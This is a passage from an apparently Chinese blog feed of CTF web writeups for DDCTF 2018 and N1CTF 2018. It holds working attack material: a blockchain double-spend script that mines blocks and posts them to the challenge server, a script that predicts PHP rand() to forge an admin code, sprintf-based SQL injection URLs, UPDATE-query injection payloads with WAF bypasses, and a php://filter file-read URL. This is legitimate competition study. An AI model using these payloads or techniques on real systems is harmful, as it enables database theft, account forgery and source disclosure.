class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</div><div class="line">        </div><div class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></div><div class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</div><div class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</div><div class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</div><div class="line">        append_block(second_block)</div><div class="line">        </div><div class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</div><div class="line">        append_block(third_block)</div><div class="line"></div><div class="line"><span class="comment"># final</span></div><div class="line">        <span class="comment"># handout2 = create_output_utxo(hacker_address, 1)</span></div><div class="line">        <span class="comment"># transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey)</span></div><div class="line"></div><div class="line">        <span class="comment"># fake_second_block = create_block(genesis_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># requests.post(url="http://127.0.0.1:5000/b9744af30897e/create_transaction",data=json.dumps(fake_second_block),proxies = &#123;"http":"http://127.0.0.1:8080"&#125;,headers=&#123;"Content-Type":"application/json"&#125;) </span></div><div class="line">        <span class="comment"># append_block(fake_second_block)</span></div><div class="line">        <span class="comment"># fake_third_block = create_block(fake_second_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_third_block)</span></div><div class="line">        <span class="comment"># fake_fourth_block = create_block(fake_third_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_fourth_block)</span></div><div class="line"></div><div class="line">        <span class="comment"># try:</span></div><div class="line"><span class="comment"># print "start attack!"</span></div><div class="line"><span class="comment"># x = 0</span></div><div class="line"><span class="comment"># while x &lt;0xfffffff:</span></div><div class="line"><span class="comment"># fouth_block =  create_block(third_block['hash'], str(x), [transferred])</span></div><div class="line"></div><div class="line"><span class="comment"># if  int(fouth_block["hash"],16)&lt;= DIFFICULTY:</span></div><div class="line"><span class="comment"># print fouth_block</span></div><div class="line"><span class="comment"># break</span></div><div class="line"><span class="comment"># x+=1</span></div><div class="line"></div><div class="line">        <span class="comment"># except:</span></div><div class="line"><span class="comment"># print "end at ",hex(x)</span></div><div class="line"><span class="comment"># print "end!"</span></div><div class="line"></div><div class="line"><span class="comment"># append_block(fouth_block)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    tail = find_blockchain_tail()</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></div><div class="line">    balance, utxos, _ = get_balance_of_all()</div><div class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</div><div class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</div><div class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</div><div class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</div><div class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</div><div class="line">    </div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</div><div class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></div><div class="line">    collected = []</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</div><div class="line">            amount -= utxo[<span class="string">'amount'</span>]</div><div class="line">            collected.append(utxo[<span class="string">'id'</span>])</div><div class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></div><div class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</div><div class="line">    outputs = [create_output_utxo(addr_to, amount)]</div><div class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</div><div class="line">        outputs.append(create_output_utxo(addr_from, the_change))</div><div class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        address = str(address)</div><div class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></div><div class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</div><div class="line"></div><div class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</div><div class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># print request.data</span></div><div class="line">        block = json.loads(request.data)</div><div class="line">        append_block(block, DIFFICULTY)</div><div class="line">        msg = <span class="string">'transaction finished.'</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> str(e)</div><div class="line">        </div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</div><div class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></div><div class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></div><div class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></div><div class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        msg += <span class="string">' You receive a diamond.'</span></div><div class="line">    <span class="keyword">return</span> msg</div><div class="line">    </div><div class="line">        </div><div class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></div><div class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></div><div class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</div><div class="line">    html = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</div><div class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</div><div class="line">    source.close()</div><div class="line">    <span class="keyword">return</span> html</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</div></pre></td></tr></table></figure><p>payload代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span>  server <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line">x = <span class="number">0</span></div><div class="line"></div><div class="line">ip = <span class="string">"116.85.48.107"</span></div><div class="line">port = <span class="string">"5000"</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/"</span>)</div><div class="line"></div><div class="line"></div><div class="line">genesis_block = re.findall(<span class="string">r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;'</span>,r.content)[<span class="number">0</span>]</div><div class="line">shop_addr = re.findall(<span class="string">r"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;"</span>,r.content)[<span class="number">0</span>]</div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line"></div><div class="line"><span class="comment"># print shop_addr</span></div><div class="line"></div><div class="line"><span class="comment"># print genesis_block</span></div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/flag"</span>,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;).content</div></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>看到提示，直接下载源码，代码审计ing  </p><p>发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由<code>str_shuffle</code>这个关键函数函数生成。</p><img src="/2018/04/19/ddctf-2018/12.png" alt="12.png" title=""><p>通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。</p><img src="/2018/04/19/ddctf-2018/13.png" alt="13.png" title=""><p>rand()函数是一个可预测的伪随机函数，具体可以参考  <a href="http://www.yqxiaojunjie.com/index.php/archives/275/" target="_blank" rel="external">http://www.yqxiaojunjie.com/index.php/archives/275/</a></p><p>再分析下 <code>RAND_RANGE</code> 的构成</p><img src="/2018/04/19/ddctf-2018/14.png" alt="14.png" title=""><p>于是根据str_shuffle的源码，来实现python版本的<code>str_shuffle</code>，写出对应的预测算法。python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">l  = [<span class="number">0</span>]*<span class="number">200</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">l[i] = re.findall(<span class="string">r'csrf" value="(.*)"'</span>,s.get(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php"</span>).content)[<span class="number">0</span>]</div><div class="line"><span class="comment"># l[i] = s.get("http://192.168.148.137/rand.php").content</span></div><div class="line"><span class="keyword">print</span> i,l[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">112</span>):</div><div class="line">m  = (int(l[i<span class="number">-3</span>])+int(l[i<span class="number">-31</span>])) % <span class="number">2147483647</span></div><div class="line"><span class="keyword">if</span> i &gt;=<span class="number">50</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>,i,m,l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m,float(m) * (<span class="number">62</span>-(i<span class="number">-49</span>)) / <span class="number">2147483647</span> </div><div class="line">l[i] = m</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="keyword">print</span> i,l[i],l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">i = <span class="number">50</span></div><div class="line">org_str  = list(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</div><div class="line"></div><div class="line">str_len = len(org_str) - <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>(str_len):</div><div class="line"><span class="comment"># rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647))</span></div><div class="line"> <span class="comment"># (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span></div><div class="line">min = <span class="number">0</span></div><div class="line">rnd_index = l[i]</div><div class="line">rnd_index = min +int( (float(str_len) - min +<span class="number">1.0</span>) * (rnd_index / (<span class="number">2147483647</span>+<span class="number">1.0</span>)) )</div><div class="line"><span class="keyword">if</span> rnd_index != str_len:</div><div class="line">temp = org_str[str_len]</div><div class="line">org_str[str_len] = org_str[rnd_index]</div><div class="line">org_str[rnd_index] = temp</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(org_str)</div><div class="line">str_len -=<span class="number">1</span></div><div class="line">i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a =  org_str[:32]</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"csrf"</span>: l[<span class="number">49</span>],</div><div class="line"><span class="string">"username"</span>: <span class="string">"winter3un2"</span>,</div><div class="line"><span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line"><span class="string">"code"</span>: <span class="string">"admin###"</span>+<span class="string">""</span>.join(org_str)[:<span class="number">32</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">print</span> s.post(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span>,data=data).content</div></pre></td></tr></table></figure><p>注册登陆后，利用sprinf函数中<code>%</code>会吞掉下一个字符的特性，具体参考 <a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="external">https://www.cnblogs.com/test404/p/7821884.html</a>  构造注入payload</p><p><code>http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s</code></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。</p><p>没分析出来啊！  虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf 2018 web writeup</title>
    <link href="https://winter3un.github.io/2018/03/19/2018-n1ctf/"/>
    <id>https://winter3un.github.io/2018/03/19/2018-n1ctf/</id>
    <published>2018-03-19T11:20:26.000Z</published>
    <updated>2018-03-19T11:23:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ</p><a id="more"></a><h2 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h2><p>PS：<strong>这个系列题真虐狗</strong></p><p>题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($points)</span></span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">return</span> $points;</div><div class="line">  &#125;</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_point</span><span class="params">($p,$points)</span></span></div><div class="line">&#123;</div><div class="line">$link=mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'ctf_test'</span>);  </div><div class="line"></div><div class="line">$q = sprintf(<span class="string">"UPDATE user SET points =%d%s"</span>,$p,waf($points));</div><div class="line">var_dump($q);</div><div class="line"><span class="keyword">if</span>(!$query =mysqli_query($link,$q)) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!update_point($_REQUEST[<span class="string">'flag'</span>],$_REQUEST[<span class="string">'hi'</span>]))<span class="keyword">echo</span> <span class="string">'sorry'</span>;</div></pre></td></tr></table></figure><p>很明显，注入点在于points这个参数。</p><p><code>docker pull ubuntu:16.04</code>本地搭建好环境测试一波。</p><p>构建数据库语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">create database ctf_test；</div><div class="line">use ctf_test;</div><div class="line">create table user (id int,name text,points int);</div></pre></td></tr></table></figure></p><p>构造update查询的注入 payload 。</p><p>查询数据库当前用户信息，发送<code>flag=0&amp;hi=%2bconv(hex(substr(user(),1, 4)), 16, 10)</code>生成查询语句，<code>UPDATE user SET points = 0+conv(hex(substr(user(),1, 4)), 16, 10)</code>，发现竟然没有被waf挡住。。。</p><p>查询当前用户表中用户密码，发送<code>flag=0&amp;hi=%2bconv(hex(substr((select password),1, 4)), 16, 10)</code>，生成查询语语句 <code>UPDATE user SET points = 0+conv(hex(substr((select password),1, 4)), 16, 10)</code>，又过了waf。。。 ？（当时有点怀疑waf的真实性，不过后来测试admin、database都被waf挡住了，拿flag做题还是没问题的，但是万一flag不在当前用户的记录里呢，怎么做偏移？~</p><h2 id="77777-2"><a href="#77777-2" class="headerlink" title="77777-2"></a>77777-2</h2><p>emmmm关键的代码没有变，加强了waf，把password，pw，union等关键词挡住了，但是可以用如下的姿势绕过。</p><p><code>flag=0&amp;hi=%2bconv(hex(substr((select pw ),1, 4)), 16, 10)</code></p><p>没错。。pw左右各一个空格就绕过了，玄学。。</p><p>后台生成查询语句为<code>UPDATE user SET points = 0+conv(hex(substr((select pw ),1, 4)), 16, 10)</code> 应该是非预期，话说正解到底是啥？</p><h2 id="funning-eating-cms"><a href="#funning-eating-cms" class="headerlink" title="funning eating cms"></a>funning eating cms</h2><p>一个cms系统。。用了网上的模版。</p><p><code>index.php</code>页面的page参数存在文件包含漏洞，但是文件后缀名必须是php的才能包含，无法用来命令执行，只能看下源码，操作姿势<a href="http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config" target="_blank" rel="external">http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config</a></p><p>把看到的php文件都下载到本地，审计一波，发现<code>function.php</code>文件内<code>parse_url</code>函数存在绕过，当构造<code>////x.php?key=value</code>这种形式的uri的时候，parse_url函数将无法解析该uri。</p><p>之后在<a href="http://47.52.152.93:20000/templates/info.html" target="_blank" rel="external">http://47.52.152.93:20000/templates/info.html</a> 的源码里得知关键信息在<code>ffffllllaaaaggg.php</code>文件里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div 